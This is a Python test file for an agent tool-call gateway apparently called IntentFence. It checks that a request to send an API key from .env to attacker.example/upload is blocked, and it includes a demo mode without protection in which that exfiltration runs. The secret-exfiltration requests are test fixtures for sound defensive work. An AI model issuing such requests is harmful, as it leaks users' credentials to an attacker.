from datetime import UTC, datetime, timedelta

from intentfence_contracts import (
    DataLabel,
    DecisionType,
    IntentContract,
    ResourceClass,
    RiskTolerance,
    Sensitivity,
    SourceContext,
)

from intentfence_api.gateway.models import GatewayMode
from intentfence_api.gateway.service import IntentFenceGateway
from intentfence_api.gateway.tools import normalize_tool_request

NOW = datetime(2026, 8, 22, tzinfo=UTC)


def _contract(*, expires_at=None) -> IntentContract:
    return IntentContract(
        intent_id="intent-1",
        session_id="session-1",
        objective="Compare hotels and save the cheaper option.",
        allowed_tools=["browse_web", "write_file", "http_request"],
        allowed_resources=["hotel_websites", "results_file"],
        forbidden_resources=["credentials", "environment_secrets"],
        allowed_destinations=["hotel-a.example", "hotel-b.example"],
        approval_required_actions=["send_message"],
        risk_tolerance=RiskTolerance.MEDIUM,
        issued_at=NOW,
        expires_at=expires_at,
        contract_version=1,
    )


def _critical_label() -> DataLabel:
    return DataLabel(
        data_id="data-secret",
        data_type="API_KEY",
        source=".env",
        source_class=ResourceClass.SECRET,
        provenance="USER_OWNED",
        sensitivity=Sensitivity.CRITICAL,
        purpose="authentication",
        owner="user",
        allowed_destinations=["internal-auth.example"],
        created_at=NOW,
    )


def _request(*, request_id: str, tool: str, arguments: dict, data_refs=None):
    return normalize_tool_request(
        request_id=request_id,
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool=tool,
        arguments=arguments,
        data_refs=data_refs or [],
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=NOW,
    )


def test_blocked_request_never_executes_handler() -> None:
    calls = []
    gateway = IntentFenceGateway()
    gateway.register_data_label(_critical_label())
    normalized = _request(
        request_id="req-block",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload"},
        data_refs=["data-secret"],
    )
    result = gateway.intercept(
        normalized,
        _contract(),
        handler=lambda arguments: calls.append(arguments) or {"status": "sent"},
        scenario_id="hotel-attack",
    )
    assert result.decision is DecisionType.BLOCK
    assert result.executed is False
    assert calls == []
    assert result.receipt is not None


def test_allowed_request_executes_handler_once() -> None:
    calls = []
    normalized = _request(
        request_id="req-safe",
        tool="browse_web",
        arguments={"url": "https://hotel-a.example"},
    )
    result = IntentFenceGateway().intercept(
        normalized,
        _contract(),
        handler=lambda arguments: calls.append(arguments) or {"price": 120},
    )
    assert result.decision is DecisionType.ALLOW
    assert result.executed is True
    assert len(calls) == 1


def test_unprotected_execution_exists_only_as_explicit_demo_method() -> None:
    calls = []
    gateway = IntentFenceGateway()
    gateway.register_data_label(_critical_label())
    normalized = _request(
        request_id="req-disabled",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload", "body_ref": "data-secret"},
        data_refs=["data-secret"],
    )
    result = gateway.intercept_unprotected_demo(
        normalized,
        _contract(),
        handler=lambda arguments: calls.append(arguments) or {"status": "sent"},
        scenario_id="hotel-attack",
    )
    assert result.executed is True
    assert result.event.gateway_mode is GatewayMode.DISABLED
    assert len(calls) == 1


def test_expired_contract_blocks_before_handler() -> None:
    calls = []
    normalized = _request(
        request_id="req-expired",
        tool="browse_web",
        arguments={"url": "https://hotel-a.example"},
    )
    result = IntentFenceGateway().intercept(
        normalized,
        _contract(expires_at=datetime.now(UTC) - timedelta(seconds=1)),
        handler=lambda arguments: calls.append(arguments) or {"price": 120},
    )
    assert result.decision is DecisionType.BLOCK
    assert result.executed is False
    assert result.event.matched_rules == ["INTENT_CONTRACT_EXPIRED"]
    assert calls == []


def test_receipt_and_event_do_not_copy_raw_arguments() -> None:
    secret = "sk-test-never-log-this"
    gateway = IntentFenceGateway()
    gateway.register_data_label(_critical_label())
    normalized = _request(
        request_id="req-secret",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload", "body": secret},
        data_refs=["data-secret"],
    )
    result = gateway.intercept(
        normalized,
        _contract(),
        handler=lambda arguments: {"status": "sent"},
    )
    assert secret not in result.model_dump_json()
